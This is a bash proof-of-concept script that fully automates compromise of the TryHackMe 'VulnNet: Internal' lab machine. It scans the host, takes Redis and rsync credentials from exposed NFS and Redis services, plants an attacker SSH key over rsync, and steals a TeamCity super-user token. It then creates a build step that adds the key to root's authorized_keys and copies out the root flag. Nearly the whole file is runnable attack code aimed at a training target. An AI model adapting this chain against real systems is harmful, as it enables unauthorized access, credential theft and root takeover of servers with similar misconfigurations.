#!/usr/bin/env bash
# =============================================================================
# VulnNet: Internal — Full Exploitation POC
# Author: 0xb0rn3
# Target: VulnNet: Internal (TryHackMe)
# =============================================================================
# Usage:
#   chmod +x vulnnet_internal_pwn.sh
#   ./vulnnet_internal_pwn.sh <TARGET_IP>
#
# Requirements:
#   nmap, smbclient, nfs-common (mount.nfs), redis-cli, rsync, ssh, curl
# =============================================================================

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
RESET='\033[0m'

TARGET="${1:-}"
WORK_DIR="/tmp/vulnnet_pwn_$$"
NFS_MOUNT="${WORK_DIR}/nfs"
KEY_FILE="${WORK_DIR}/id_rsa"
TEAMCITY_PORT=8111

banner() {
    echo -e "${CYAN}"
    cat <<'EOF'
 __   __   _         _  _     _        ___       _                            _
 \ \ / /  | |       | \| |  _| |_     |_ _|_ _  | |_ ___ _ _ _ _  __ _| |
  \ V /   | |__    | .` | / _  _|     | || ' \ |  _/ -_) '_| ' \/ _` | |
   \_/    |____|   |_|\_| \__|_|     |___|_||_| \__\___|_| |_||_\__,_|_|

            VulnNet: Internal — Full Auto PWN by 0xb0rn3
EOF
    echo -e "${RESET}"
}

log_info()    { echo -e "${CYAN}[*]${RESET} $*"; }
log_ok()      { echo -e "${GREEN}[+]${RESET} $*"; }
log_warn()    { echo -e "${YELLOW}[!]${RESET} $*"; }
log_flag()    { echo -e "${GREEN}${BOLD}[FLAG]${RESET} $*"; }
log_section() { echo -e "\n${BOLD}${YELLOW}═══ $* ═══${RESET}\n"; }
die()         { echo -e "${RED}[FATAL]${RESET} $*" >&2; exit 1; }

check_deps() {
    log_section "Checking Dependencies"
    local missing=()
    for dep in nmap smbclient redis-cli rsync ssh curl mount; do
        if ! command -v "$dep" &>/dev/null; then
            missing+=("$dep")
        else
            log_ok "$dep found"
        fi
    done
    if [[ ${#missing[@]} -gt 0 ]]; then
        die "Missing dependencies: ${missing[*]}"
    fi
}

setup_workspace() {
    mkdir -p "${WORK_DIR}" "${NFS_MOUNT}"
    log_info "Working directory: ${WORK_DIR}"
}

cleanup() {
    log_info "Cleaning up..."
    # Unmount NFS if mounted
    if mountpoint -q "${NFS_MOUNT}" 2>/dev/null; then
        sudo umount "${NFS_MOUNT}" 2>/dev/null || true
    fi
    # Kill SSH tunnel if running
    if [[ -f "${WORK_DIR}/ssh_tunnel.pid" ]]; then
        kill "$(cat "${WORK_DIR}/ssh_tunnel.pid")" 2>/dev/null || true
    fi
    rm -rf "${WORK_DIR}"
}
trap cleanup EXIT

# =============================================================================
# PHASE 1: RECONNAISSANCE
# =============================================================================

phase_recon() {
    log_section "Phase 1: Reconnaissance"
    log_info "Running nmap on ${TARGET}..."

    nmap -sV -sC -p 22,111,139,445,873,2049,6379 --min-rate 3000 -Pn \
        -oN "${WORK_DIR}/nmap.txt" "${TARGET}" 2>/dev/null

    log_ok "Scan complete. Key services:"
    grep "open" "${WORK_DIR}/nmap.txt" | grep -v "^#" | awk '{print "    " $0}' || true
}

# =============================================================================
# PHASE 2: SMB — services.txt flag
# =============================================================================

phase_smb() {
    log_section "Phase 2: SMB Enumeration"
    log_info "Enumerating SMB shares anonymously..."

    smbclient //\\"${TARGET}"/shares -N \
        -c "get temp/services.txt ${WORK_DIR}/services.txt" 2>/dev/null || true

    if [[ -f "${WORK_DIR}/services.txt" ]]; then
        SMB_FLAG=$(cat "${WORK_DIR}/services.txt")
        log_flag "services.txt → ${SMB_FLAG}"
    else
        log_warn "Could not retrieve services.txt from SMB"
    fi
}

# =============================================================================
# PHASE 3: NFS — Leak Redis Credentials
# =============================================================================

phase_nfs() {
    log_section "Phase 3: NFS Enumeration"
    log_info "Mounting NFS export /opt/conf from ${TARGET}..."

    sudo mount -t nfs "${TARGET}:/opt/conf" "${NFS_MOUNT}" -o ro 2>/dev/null \
        || die "NFS mount failed. Are you running as root/sudo?"

    log_ok "NFS mounted at ${NFS_MOUNT}"
    log_info "Searching for Redis password in config..."

    REDIS_PASS=$(grep "^requirepass" "${NFS_MOUNT}/redis/redis.conf" 2>/dev/null \
        | awk '{print $2}' | tr -d '"')

    if [[ -z "${REDIS_PASS}" ]]; then
        die "Could not find Redis password in NFS mount"
    fi

    log_ok "Redis password found: ${REDIS_PASS}"
}

# =============================================================================
# PHASE 4: REDIS — Internal Flag + Rsync Credentials
# =============================================================================

phase_redis() {
    log_section "Phase 4: Redis Enumeration"
    log_info "Connecting to Redis with found credentials..."

    REDIS_CMD="redis-cli -h ${TARGET} -a ${REDIS_PASS} --no-auth-warning"

    if ! ${REDIS_CMD} ping &>/dev/null; then
        die "Redis auth failed"
    fi

    log_ok "Redis authenticated"

    # Get internal flag
    INTERNAL_FLAG=$(${REDIS_CMD} get "internal flag" 2>/dev/null)
    log_flag "internal flag → ${INTERNAL_FLAG}"

    # Get rsync credentials from authlist
    log_info "Extracting rsync credentials from authlist..."
    AUTHLIST_B64=$(${REDIS_CMD} lindex authlist 0 2>/dev/null)

    if [[ -z "${AUTHLIST_B64}" ]]; then
        die "authlist is empty"
    fi

    AUTH_DECODED=$(echo "${AUTHLIST_B64}" | base64 -d 2>/dev/null)
    log_ok "Decoded: ${AUTH_DECODED}"

    RSYNC_USER=$(echo "${AUTH_DECODED}" | grep -oP 'rsync://\K[^@]+')
    RSYNC_PASS=$(echo "${AUTH_DECODED}" | awk '{print $NF}')

    log_ok "Rsync user: ${RSYNC_USER}"
    log_ok "Rsync password: ${RSYNC_PASS}"
}

# =============================================================================
# PHASE 5: RSYNC — User Flag + SSH Key Injection
# =============================================================================

phase_rsync() {
    log_section "Phase 5: Rsync Access"
    log_info "Listing rsync shares with credentials..."

    export RSYNC_PASSWORD="${RSYNC_PASS}"

    rsync --list-only "rsync://${RSYNC_USER}@${TARGET}/files/" 2>/dev/null \
        | awk '{print "    " $0}'

    # Get user.txt
    log_info "Downloading user.txt..."
    rsync "rsync://${RSYNC_USER}@${TARGET}/files/sys-internal/user.txt" \
        "${WORK_DIR}/user.txt" 2>/dev/null

    USER_FLAG=$(cat "${WORK_DIR}/user.txt" 2>/dev/null)
    log_flag "user.txt → ${USER_FLAG}"

    # Generate SSH key pair
    log_info "Generating SSH key pair..."
    ssh-keygen -t rsa -b 4096 -f "${KEY_FILE}" -N "" -q

    # Upload authorized_keys
    log_info "Injecting SSH public key via rsync..."
    cp "${KEY_FILE}.pub" "${WORK_DIR}/authorized_keys"
    rsync "${WORK_DIR}/authorized_keys" \
        "rsync://${RSYNC_USER}@${TARGET}/files/sys-internal/.ssh/authorized_keys" 2>/dev/null

    log_ok "SSH public key uploaded to sys-internal's .ssh/"

    # Test SSH
    log_info "Testing SSH access as sys-internal..."
    SSH_ID=$(ssh -i "${KEY_FILE}" \
        -o StrictHostKeyChecking=no \
        -o ConnectTimeout=10 \
        sys-internal@"${TARGET}" "id" 2>/dev/null) || die "SSH login failed"

    log_ok "SSH access confirmed: ${SSH_ID}"
}

# =============================================================================
# PHASE 6: TEAMCITY — Privilege Escalation via Build RCE
# =============================================================================

phase_teamcity() {
    log_section "Phase 6: TeamCity Privilege Escalation"

    # Get TeamCity super user token
    log_info "Searching for TeamCity super user token in logs..."
    TC_TOKEN=$(ssh -i "${KEY_FILE}" \
        -o StrictHostKeyChecking=no \
        -o ConnectTimeout=10 \
        sys-internal@"${TARGET}" \
        "grep 'Super user authentication token' /TeamCity/logs/catalina.out | tail -1 | grep -oP '\d{15,}'" \
        2>/dev/null)

    if [[ -z "${TC_TOKEN}" ]]; then
        die "Could not find TeamCity super user token"
    fi

    log_ok "TeamCity super user token: ${TC_TOKEN}"

    # Set up SSH port forward to TeamCity (port 8111)
    log_info "Setting up SSH tunnel to TeamCity on port ${TEAMCITY_PORT}..."
    ssh -i "${KEY_FILE}" \
        -o StrictHostKeyChecking=no \
        -o ConnectTimeout=10 \
        -L "${TEAMCITY_PORT}:127.0.0.1:${TEAMCITY_PORT}" \
        sys-internal@"${TARGET}" -N -f \
        2>/dev/null

    # Store tunnel PID for cleanup
    pgrep -f "L ${TEAMCITY_PORT}:127.0.0.1:${TEAMCITY_PORT}" > "${WORK_DIR}/ssh_tunnel.pid" 2>/dev/null || true
    sleep 3

    TC_URL="http://127.0.0.1:${TEAMCITY_PORT}"
    TC_AUTH=":${TC_TOKEN}"

    # Verify API access
    log_info "Verifying TeamCity REST API access..."
    TC_VER=$(curl -sf -u "${TC_AUTH}" "${TC_URL}/app/rest/server" \
        -H "Accept: application/json" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['version'])")

    log_ok "TeamCity version: ${TC_VER}"

    # Create project
    log_info "Creating malicious TeamCity project..."
    curl -sf -u "${TC_AUTH}" -X POST "${TC_URL}/app/rest/projects" \
        -H "Content-Type: application/json" \
        -H "Accept: application/json" \
        -d '{"name":"Pwn","id":"Pwn","parentProject":{"id":"_Root"}}' \
        -o /dev/null

    # Create build type
    log_info "Creating build configuration..."
    curl -sf -u "${TC_AUTH}" -X POST "${TC_URL}/app/rest/buildTypes" \
        -H "Content-Type: application/json" \
        -H "Accept: application/json" \
        -d '{"id":"PwnBuild","name":"PwnBuild","project":{"id":"Pwn"}}' \
        -o /dev/null

    # Build step payload: add root SSH key + read root.txt
    PUBKEY=$(cat "${KEY_FILE}.pub")
    PAYLOAD=$(python3 -c "
import json, sys
pubkey = sys.argv[1]
step = {
    'name': 'pwn',
    'type': 'simpleRunner',
    'properties': {
        'property': [
            {'name': 'script.content', 'value': f'mkdir -p /root/.ssh && echo \"{pubkey}\" >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && cat /root/root.txt > /tmp/root_flag.txt'},
            {'name': 'teamcity.step.mode', 'value': 'default'},
            {'name': 'use.custom.script', 'value': 'true'}
        ]
    }
}
print(json.dumps(step))
" "${PUBKEY}")

    log_info "Adding malicious build step (injects root SSH key)..."
    curl -sf -u "${TC_AUTH}" -X POST "${TC_URL}/app/rest/buildTypes/id:PwnBuild/steps" \
        -H "Content-Type: application/json" \
        -H "Accept: application/json" \
        -d "${PAYLOAD}" \
        -o /dev/null

    # Trigger the build
    log_info "Triggering build (executes as root)..."
    BUILD_ID=$(curl -sf -u "${TC_AUTH}" -X POST "${TC_URL}/app/rest/buildQueue" \
        -H "Content-Type: application/json" \
        -H "Accept: application/json" \
        -d '{"buildType": {"id": "PwnBuild"}}' \
        | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

    log_ok "Build queued with ID: ${BUILD_ID}"

    # Wait for build to complete
    log_info "Waiting for build to complete..."
    local max_wait=60
    local elapsed=0
    while true; do
        STATE=$(curl -sf -u "${TC_AUTH}" "${TC_URL}/app/rest/builds/id:${BUILD_ID}" \
            -H "Accept: application/json" 2>/dev/null \
            | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('state',''))" 2>/dev/null)

        if [[ "${STATE}" == "finished" ]]; then
            log_ok "Build finished!"
            break
        fi

        sleep 3
        elapsed=$((elapsed + 3))
        if [[ ${elapsed} -ge ${max_wait} ]]; then
            die "Build timed out after ${max_wait}s"
        fi
    done
}

# =============================================================================
# PHASE 7: ROOT ACCESS + FLAGS
# =============================================================================

phase_root() {
    log_section "Phase 7: Root Access"

    # Read root flag via sys-internal (written by build)
    ROOT_FLAG=$(ssh -i "${KEY_FILE}" \
        -o StrictHostKeyChecking=no \
        -o ConnectTimeout=10 \
        sys-internal@"${TARGET}" \
        "cat /tmp/root_flag.txt" 2>/dev/null)

    log_flag "root.txt → ${ROOT_FLAG}"

    # Try direct root SSH
    log_info "Attempting direct root SSH login..."
    ROOT_ID=$(ssh -i "${KEY_FILE}" \
        -o StrictHostKeyChecking=no \
        -o ConnectTimeout=10 \
        root@"${TARGET}" "id" 2>/dev/null) || log_warn "Direct root SSH not available"

    if [[ -n "${ROOT_ID:-}" ]]; then
        log_ok "Root shell confirmed: ${ROOT_ID}"
    fi
}

# =============================================================================
# SUMMARY
# =============================================================================

print_summary() {
    log_section "Exploitation Complete — Flag Summary"
    echo -e "${BOLD}"
    printf "  %-20s %s\n" "services.txt:"  "${SMB_FLAG:-N/A}"
    printf "  %-20s %s\n" "internal flag:" "${INTERNAL_FLAG:-N/A}"
    printf "  %-20s %s\n" "user.txt:"      "${USER_FLAG:-N/A}"
    printf "  %-20s %s\n" "root.txt:"      "${ROOT_FLAG:-N/A}"
    echo -e "${RESET}"
}

# =============================================================================
# MAIN
# =============================================================================

main() {
    banner

    if [[ -z "${TARGET}" ]]; then
        echo "Usage: $0 <TARGET_IP>"
        exit 1
    fi

    log_info "Target: ${TARGET}"
    log_info "Output: ${WORK_DIR}"

    check_deps
    setup_workspace

    phase_recon
    phase_smb
    phase_nfs
    phase_redis
    phase_rsync
    phase_teamcity
    phase_root
    print_summary
}

main "$@"
